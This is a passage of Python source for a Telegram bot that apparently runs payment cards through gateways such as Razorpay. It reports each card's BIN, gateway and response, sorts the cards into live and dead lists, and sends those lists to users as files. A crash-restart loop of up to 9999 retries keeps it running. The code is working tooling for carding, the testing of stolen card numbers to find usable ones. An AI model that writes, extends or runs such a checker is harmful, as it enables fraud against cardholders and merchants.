⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {s_emoji} {s_text}
⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {message}
━━━━━━━━━━━━━━━━━━━━
{currency} 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {currency}{price}
💳 𝐁𝐢𝐧 ➜ {bin_num}
🌐 Gateway ➜ {gateway}
━━━━━━━━━━━━━━━━━━━━

""")

    await bot.send_message(
        user_id,
        premium_emoji(f"<b>{emoji} {title} - {len(filtered)} Cards Sent!</b>"),
        file=filename,
        parse_mode="html"
    )
    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.CallbackQuery(pattern=b"dead"))
async def dead_btn_handler(event):
    user_id = event.sender_id
    session_key = None

    for k in active_sessions:
        if str(user_id) in k:
            session_key = k
            break

    if session_key and active_sessions[session_key].get('results'):
        results = active_sessions[session_key]['results']
        if results.get('dead'):
            await send_filtered_results(user_id, results, "dead")
        else:
            await event.answer("No dead cards yet!", alert=True)
    else:
        await event.answer("No active session found!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop_"))
async def stop_handler(event):
    user_id = event.sender_id
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id

    msg = await event.get_message()
    text = getattr(msg, 'message', '')
    session_key = f"rz_{user_id}_{msg_id}" if "Razorpay" in text or "rz_" in text else f"{user_id}_{msg_id}"

    if session_key not in active_sessions:
        session_key = f"{user_id}_{msg_id}"

    await event.answer("🛑 Stopping...", alert=True)

    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await asyncio.sleep(1.0)

        try:
            results = active_sessions[session_key].get('results', {})
            await send_final_results(user_id, results)
        except Exception as e:
            print(f"Partial save error: {e}")

        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await event.edit(premium_emoji("🛑 **Stopped!**"))
        except:
            pass
    else:
        await event.answer("No active session found!", alert=True)

print("✅ Bot started successfully!")

if __name__ == "__main__":
    print("🔥 UNLIMITED BOT ENGAGED 🔥")

    retry_count = 0
    max_retries = 9999

    while retry_count < max_retries:
        try:
            print(f"🌐 Bot running... (attempt {retry_count + 1})")
            bot.start()
            bot.run_until_disconnected()
            break

        except KeyboardInterrupt:
            print("🛑 User stopped the bot manually.")
            break

        except Exception as e:
            retry_count += 1
            error_str = str(e)
            print(f"💥 Bot crashed: {error_str}")

            if "FloodWaitError" in error_str or "rate limited" in error_str.lower() or "429" in error_str:
                wait_seconds = 5
                print(f"⚠️ FLOODWAIT DETECTED | Sleeping {wait_seconds}s...")
                time.sleep(wait_seconds)
            else:
                time.sleep(10)

            if retry_count % 10 == 0:
                print("🔄 Performing cleanup...")
                for sess in list(active_sessions.keys()):
                    if active_sessions[sess].get('paused') == 'stopping':
                        del active_sessions[sess]

    print("🛑 Bot execution ended.")
